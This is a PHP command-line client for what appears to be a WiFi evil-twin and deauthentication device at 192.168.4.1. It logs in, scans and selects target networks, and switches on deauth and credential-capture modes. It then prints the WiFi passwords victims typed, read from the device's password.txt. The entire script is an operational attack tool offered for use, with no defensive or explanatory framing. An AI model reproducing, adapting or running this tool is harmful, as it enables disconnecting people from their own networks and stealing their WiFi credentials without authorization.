<?php
error_reporting(0);
function curl($url, $ua, $data= null){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_COOKIEJAR, 'att.txt');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $ua);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
/**	curl_setopt($ch, CURLOPT_VERBOSE, 1);**/
	$result = curl_exec($ch);
	return $result;
}
 function get($url){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, 'att.txt');
	$result = curl_exec($ch);
	return $result;
}
$ua = array(
"Host: 192.168.4.1",
"Connection: keep-alive",
"Cache-Control: max-age=0",
"Upgrade-Insecure-Requests: 1",
"Save-Data: on",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"Referer: http://192.168.4.1/login",
"Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
  );
 $bar = "
╭━━━┳━━━━┳━━━━╮╱╭━━━┳╮╱╱╭━━╮
┃╭━╮┃╭╮╭╮┃╭╮╭╮┃╱┃╭━╮┃┃╱╱╰┫┣╯
┃┃╱┃┣╯┃┃╰┻╯┃┃╰╯╱┃┃╱╰┫┃╱╱╱┃┃
┃╰━╯┃╱┃┃╱╱╱┃┃╭━━┫┃╱╭┫┃╱╭╮┃┃
┃╭━╮┃╱┃┃╱╱╱┃┃╰━━┫╰━╯┃╰━╯┣┫┣╮
╰╯╱╰╯╱╰╯╱╱╱╰╯╱╱╱╰━━━┻━━━┻━━╯ By Febryan\n\n";
print $bar;
print "Please Login...\n[>] Password: ";
$pass = trim(fgets(STDIN));

$data = "strWebUsername=razor&PASSWORD=$pass&SUBMIT=Submit";
$login = curl("http://192.168.4.1/login", $ua, $data);

$beranda = explode('o_deauth', $login);
$log = $beranda[1];
if(isset($log)){
print "[*] SUCCESS LOGIN\n";
sleep(5);
menu:
system('clear');
print $bar;
print "MENU:\n[1] SELECT TARGET\n[2] MODE SETTINGS\n[3] LIST PASSWORDS\n[4] REBOOT\n[5] START\n\n[>]Select: ";
$menu = trim(fgets(STDIN));
if($menu == 1){
  goto select;
}
if($menu == 2){
  goto option;
}
if($menu == 3){
  goto pass;
}
if($menu == 4){
$rebot = get('http://192.168.4.1/reboot');
  goto menu;
}
if($menu ==  5){
  print '["PLEASE TURN OFF YOU WIFI TO START MODE & BACK AGAIN"]';
  sleep("15");
  goto menu;
}
select:
system("clear");
print $bar;
print "[*] BSSID&SSID List:\n";
$survey = get('http://192.168.4.1/survey');
  for($a=1; $a<7; $a++){
  $list = explode('?', $survey);
  $list = explode('>', $list[$a]);
  print "\n $list[0]";
}
  
print "\n[5]BACK MENU \n";
print "\n[>]Copy BSSID&SSID in here: ";
$selet = trim(fgets(STDIN));
if($selet == 5){
  goto menu;
}
$gas = get("http://192.168.4.1/settarget?$selet");
goto menu;
option:
system("clear");
$getmenu= get('http://192.168.4.1/setup');
$targe = explode('/survey>', $getmenu);
$targe = explode('</a>', $targe[1]);
$obot = explode('o_autoreboot>', $getmenu);
$obot = explode('</a>', $obot[1]);
$getd = explode('o_deauth>', $getmenu);
$getd = explode('</a>', $getd[1]);
$getv = explode('o_inputvalid>', $getmenu);
$getv = explode('</a>', $getv[1]);
$deauth = $getd[0];
$inputv = $getv[0];
$target = $targe[0];
$autor = $obot[0];
print $bar;
print "\nWifi Target: [$target]\nAttack Mode\n[1]Deauth [$deauth]\n[2]Input Validation[$inputv]\n[3]Auto Reboot [$autor]\n\n[4]BACK MENU\n[>]Select: ";
$mode = trim(fgets(STDIN));
if($mode == 1){
$getdeauth = get('http://192.168.4.1/o_deauth');
  system('clear');
  goto option;
}
if($mode == 2){
    $getinput= get('http://192.168.4.1/o_inputvalid');
     system('clear');
     goto option;
}
if($mode == 3){
$getautor = get('http://192.168.4.1/o_autoreboot');
  system('clear');
  goto option;
}
if($mode == 4){
  goto menu;
}

pass:
system('clear');
print $bar;
$info = get('http://192.168.4.1/password.txt');
print "Password:\n$info\n";
print "[5]BACK MENU\n\n[>]Select: ";
$ps = trim(fgets(STDIN));
if($ps == 5){
  goto menu;
}
}else{
  print "Password Wrong\n";
} 
?>
